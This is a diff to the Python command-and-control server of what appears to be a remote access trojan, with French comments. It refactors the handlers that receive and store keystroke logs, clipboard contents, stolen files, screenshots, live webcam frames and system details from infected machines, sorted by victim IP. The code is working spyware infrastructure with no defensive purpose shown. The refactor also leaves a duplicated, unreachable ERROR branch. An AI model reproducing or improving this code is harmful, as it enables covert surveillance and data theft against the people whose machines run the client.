@@ -182,139 +182,153 @@ def kill_client():
 def handle_client(client_socket, client_address):
     global stop
     while not stop:
+        data = b""
         try:
-            data = b""
+            # Réception des données en continu jusqu'à ce qu'il n'y ait plus rien à lire
             while True:
-                part = client_socket.recv(1024)
+                part = client_socket.recv(4096)  # Augmentation de la taille pour une meilleure efficacité
                 if not part:
                     break
                 data += part
-                if len(part) < 1024:
+                # Si la taille de la dernière partie est inférieure à 4096, on suppose que c'est la fin du message
+                if len(part) < 4096:
                     break
 
             if not data:
                 print(f"Client {client_address} disconnected")
                 break
 
-            try:
-                client_info = json.loads(data.decode())
-                data_command = client_info.get('command')
-
-                ip = client_address[0]
-                date = time.strftime("%d%m%Y")
-
-                if data_command == 'LOG':
-                    filename = client_info['filename']
-                    filename = filename.split('-')[1]
-                    file_content = client_info['file_content']
-                    file_content_bytes = base64.b64decode(file_content)
-                    dir_name = LOG_FILE_DIR.format(ip=ip, date=date)
-
-                    if not os.path.exists(dir_name):
-                        os.makedirs(dir_name)
-
-                    with open(dir_name + '/' + filename, 'wb') as f:
-                        f.write(file_content_bytes)
-
-                if data_command == 'COPY':
-                    filename = client_info['filename']
-                    clipboard_content = client_info['clipboard_content']
-                    clipboard_content_bytes = base64.b64decode(clipboard_content)
-                    dir_name = CLIPBOARD_DIR.format(ip=ip, date=date)
-
-                    if not os.path.exists(dir_name):
-                        os.makedirs(dir_name)
-
-                    with open(dir_name + '/' + filename, 'ab') as f:
-                        f.write(clipboard_content_bytes)
-                        f.write(b'\n')
-
-                elif data_command == 'READ':
-                    global READ_FILE_DIR
-                    filename = client_info['filename'].split('\\')[-1]
-                    file_content = client_info['file_content']
-                    dir_name = READ_FILE_DIR.format(ip=ip, date=date)
-                    file_content_bytes = base64.b64decode(file_content)
-
-                    if not os.path.exists(dir_name):
-                        os.makedirs(dir_name)
-
-                    with open(dir_name + '/' + filename, 'wb') as f:
-                        f.write(file_content_bytes)
-                        print(f"File {filename} saved to {dir_name}")
-
-                elif data_command == 'SHOW':
-                    files = client_info['files']
-                    print("\nFiles or directories:")
-                    for file in files:
-                        print(f"{file['name']} ({file['type']})")
-
-                elif data_command == 'SCREENSHOT':
-                    global SCREENSHOT_DIR
-                    screenshot = client_info['screenshot']
-                    screenshot_bytes = base64.b64decode(screenshot)
-                    current_time = time.strftime("%Hh-%Mmin-%Ss")
-                    dir_name = SCREENSHOT_DIR.format(ip=ip, date=date)
-
-                    if not os.path.exists(dir_name):
-                        os.makedirs(dir_name)
-
-                    with open(dir_name + '/' + current_time + '.png', 'wb') as f:
-                        f.write(screenshot_bytes)
-                        print(f"Screenshot saved to {dir_name}")
-
-                elif data_command == 'WEBCAM':
-                    image_encoded = client_info['image']
-                    image_bytes = base64.b64decode(image_encoded)
-                    image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)
-
-                    cv2.namedWindow(f"Webcam {client_address}")
-                    cv2.imshow(f"Webcam {client_address}", image)
-
-                    if cv2.waitKey(1) & 0xFF == ord('q'):
-                        cv2.destroyAllWindows()
-                        client_info = {
-                            'command': 'WEBCAM'
-                        }
-                        json_data = json.dumps(client_info)
-                        client_socket.send(json_data.encode())
-
-                elif data_command == 'SYSTEM':
-                    system = client_info['system']
-                    node = client_info['node']
-                    release = client_info['release']
-                    version = client_info['version']
-                    machine = client_info['machine']
-                    processor = client_info['processor']
-                    print(f"System information from client {client_address}:")
-                    print(f"System: {system}")
-                    print(f"Node: {node}")
-                    print(f"Release: {release}")
-                    print(f"Version: {version}")
-                    print(f"Machine: {machine}")
-                    print(f"Processor: {processor}")
-
-                elif data_command == 'KILL':
-                    stop = client_info['stop']
-                    if stop:
-                        print("Killing server...")
-                        client_socket.close()
-                        os._exit(0)
-                        break
-
-                elif data_command == 'ERROR':
-                    error = client_info['error']
-                    print(f"Error from client: {error}")
-
-            except json.JSONDecodeError as e:
-                print(f"JSON decode error: {e}")
+            # Traitement des données reçues
+            process_received_data(data, client_socket, client_address)
 
         except socket.error as e:
             print(f"Socket error with {client_address}: {e}")
             break
+        except json.JSONDecodeError as e:
+            print(f"JSON decode error: {e}")
 
     client_socket.close()
     print(f"Connection with {client_address} closed")
+
+
+def process_received_data(data, client_socket, client_address):
+    client_info = json.loads(data.decode())
+    data_command = client_info.get('command')
+
+    ip = client_address[0]
+    date = time.strftime("%Y%m%d")  # Format de date ISO pour une meilleure lisibilité et standardisation
+
+    # Traitement basé sur la commande reçue
+    if data_command == 'LOG':
+        process_log_command(client_info, client_socket, ip, date)
+    elif data_command == 'COPY':
+        process_copy_command(client_info, client_socket, ip, date)
+    elif data_command == 'READ':
+        process_read_command(client_info, client_socket, ip, date)
+    elif data_command == 'SHOW':
+        process_show_command(client_info, client_socket)
+    elif data_command == 'SCREENSHOT':
+        process_screenshot_command(client_info, client_socket, ip, date)
+    elif data_command == 'WEBCAM':
+        process_webcam_command(client_info, client_socket, client_address)
+    elif data_command == 'SYSTEM':
+        process_system_command(client_info, client_socket, client_address)
+    elif data_command == 'ERROR':
+        process_error_command(client_info, client_socket)
+    elif data_command == 'KILL':
+        global stop
+        stop = True
+        print("Killing server...")
+        os._exit(0)
+    elif data_command == 'ERROR':
+        print(f"Error from client: {client_info['error']}")
+
+
+def process_log_command(client_info, client_socket, ip, date):
+    filename = client_info['filename'].split('-')[1]
+    file_content_bytes = base64.b64decode(client_info['file_content'])
+    dir_name = LOG_FILE_DIR.format(ip=ip, date=date)
+
+    if not os.path.exists(dir_name):
+        os.makedirs(dir_name)
+
+    with open(os.path.join(dir_name, filename), 'wb') as f:
+        f.write(file_content_bytes)
+    print(f"Log file {filename} saved to {dir_name}")
+
+
+def process_copy_command(client_info, client_socket, ip, date):
+    filename = client_info['filename']
+    clipboard_content_bytes = base64.b64decode(client_info['clipboard_content'])
+    dir_name = CLIPBOARD_DIR.format(ip=ip, date=date)
+
+    if not os.path.exists(dir_name):
+        os.makedirs(dir_name)
+
+    with open(os.path.join(dir_name, filename), 'ab') as f:
+        f.write(clipboard_content_bytes)
+        f.write(b'\n')
+    print(f"Clipboard content saved to {filename}")
+
+
+def process_read_command(client_info, client_socket, ip, date):
+    filename = client_info['filename'].split('\\')[-1]
+    file_content_bytes = base64.b64decode(client_info['file_content'])
+    dir_name = READ_FILE_DIR.format(ip=ip, date=date)
+
+    if not os.path.exists(dir_name):
+        os.makedirs(dir_name)
+
+    with open(os.path.join(dir_name, filename), 'wb') as f:
+        f.write(file_content_bytes)
+    print(f"File {filename} saved to {dir_name}")
+
+
+def process_show_command(client_info, client_socket):
+    files = client_info['files']
+    print("\nFiles or directories:")
+    for file in files:
+        print(f"{file['name']} ({file['type']})")
+
+
+def process_screenshot_command(client_info, client_socket, ip, date):
+    screenshot_bytes = base64.b64decode(client_info['screenshot'])
+    current_time = time.strftime("%Hh-%Mmin-%Ss")
+    dir_name = SCREENSHOT_DIR.format(ip=ip, date=date)
+
+    if not os.path.exists(dir_name):
+        os.makedirs(dir_name)
+
+    with open(os.path.join(dir_name, current_time + '.png'), 'wb') as f:
+        f.write(screenshot_bytes)
+    print(f"Screenshot saved to {dir_name}")
+
+
+def process_webcam_command(client_info, client_socket, client_address):
+    image_bytes = base64.b64decode(client_info['image'])
+    image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)
+
+    cv2.namedWindow(f"Webcam {client_address}")
+    cv2.imshow(f"Webcam {client_address}", image)
+    if cv2.waitKey(1) & 0xFF == ord('q'):
+        cv2.destroyAllWindows()
+
+
+def process_system_command(client_info, client_socket, client_address):
+    system_info = "\n".join([
+        f"System information from client {client_address}:",
+        f"System: {client_info['system']}",
+        f"Node: {client_info['node']}",
+        f"Release: {client_info['release']}",
+        f"Version: {client_info['version']}",
+        f"Machine: {client_info['machine']}",
+        f"Processor: {client_info['processor']}"
+    ])
+    print(system_info)
+
+
+def process_error_command(client_info, client_socket):
+    print(f"Error from client: {client_info['error']}")
 
 
 # Function to accept connections from the client
